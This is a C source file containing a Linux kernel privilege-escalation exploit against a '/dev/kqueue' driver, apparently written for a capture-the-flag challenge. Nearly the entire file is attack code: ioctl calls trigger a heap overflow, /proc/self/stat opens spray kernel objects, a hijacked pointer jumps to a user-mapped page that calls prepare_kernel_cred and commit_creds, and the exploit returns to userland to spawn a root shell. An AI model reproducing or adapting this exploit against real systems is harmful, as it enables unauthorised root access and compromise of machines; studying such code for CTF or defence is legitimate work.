
```c
#define EDIT_KQUEUE 0xDAADEEEE

#define DELETE_KQUEUE 0xBADDCAFE

#define SAVE 0xB105BABE

/* This is how a typical request looks */

typedef struct{

uint32_t max_entries;

uint16_t data_size;

uint16_t entry_idx;

uint16_t queue_idx;

char* data;

}request_t;

char *file = "/dev/kqueue";

int fd;

int seq_fd[0x200]={0};

uint64_t f_shell;

uint64_t user_cs,user_ss,user_sp,user_rflags,evil_rip;

void save_state(){

__asm__(".intel_syntax noprefix;"

"mov user_cs,cs;"

"mov user_ss,ss;"

"mov user_sp,rsp;"

"pushf;"

"pop user_rflags;"

".att_syntax;"

);

}

static void delete(int idx){

request_t r_del = {

.queue_idx = idx,

};

ioctl(fd,DELETE_KQUEUE,&r_del);

}

static void create(uint32_t max_entries,uint16_t data_size){

request_t r = {

.max_entries = max_entries,

.data_size = data_size,

};

ioctl(fd,CREATE_KQUEUE,&r);

}

static void save(uint16_t queue_idx,uint32_t max_entries,uint16_t data_size){

request_t r = {

.max_entries = max_entries,

.queue_idx = queue_idx,

.data_size = data_size

};

ioctl(fd,SAVE,&r);

}

static void edit(uint16_t queue_idx,uint16_t entry_idx,char* data){

request_t r = {

.queue_idx = queue_idx,

.entry_idx = entry_idx,

.data = data

};

ioctl(fd,EDIT_KQUEUE,&r);

}

void spray(){

for(int i=0;i<0x100;i++){

seq_fd[i] = open("/proc/self/stat", O_RDONLY);

if(seq_fd[i]<=0){printf("open seq failed\n");}

}

puts("[+] spray() done");

}

void spray_2(){

for(int i=0x100;i<0x200;i++){

seq_fd[i] = open("/proc/self/stat", O_RDONLY);

if(seq_fd[i]<=0){printf("open seq failed\n");}

}

puts("[+] spray() done");

}

void trigger(){

char data[0x10];

for(int i=0;i<0x200;i++){

read(seq_fd[i],(char *)data,0x10);

}

}

void shell(){

system("/bin/sh");

}

void fuck(){

asm(

".intel_syntax noprefix;"

"mov r12,[rsp+0x8];"

"mov r13,r12;"

"sub r12, 0x174bf9;"

"sub r13, 0x175039;"

"mov rdi, 0;"

"call r12;"

"mov rdi,rax;"

"call r13;"

"swapgs;"

"mov r14, user_ss;"

"push r14;"

"mov r14, user_sp;"

"push r14;"

"mov r14, user_rflags;"

"push r14;"

"mov r14, user_cs;"

"push r14;"

"mov r14, evil_rip;"

"push r14;"

"iretq;"

".att_syntax;"

);

}

// r12 0xffffffff81201179
// 0xffffffff8108c580 T prepare_kernel_cred
// 0xffffffff8108c140 T commit_creds

void new_page(){

uint64_t page=0x1234f000;

if (mmap((void *)page, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) == MAP_FAILED){

perror("[-] failed to mmap");

}

*((uint64_t *)0x1234f000) = (uint64_t)fuck;

printf("fuck(): %#lx\n",fuck);

printf("[+] mmap %#lx\n",page);

}

int main(){

save_state();

evil_rip = (uint64_t)shell;

new_page();

uint64_t data[4]={0x6161616161616161,0x1234f000,0x6161616161616161,0x1234f000};

fd = open(file,0);

if(fd<0){perror(file);exit(0);}

create(0xffffffff,0x10);

edit(0,0,(char *)data); // 放好evil数据，为下一次堆溢出做准备

spray();

save(0,0x0,0x10);

create(0xffffffff,0x20);

spray_2();

save(1,0x1,0x10);

trigger();

return 0;

}

//0xffffffff81037727 : xchg eax, esp ; ret
```
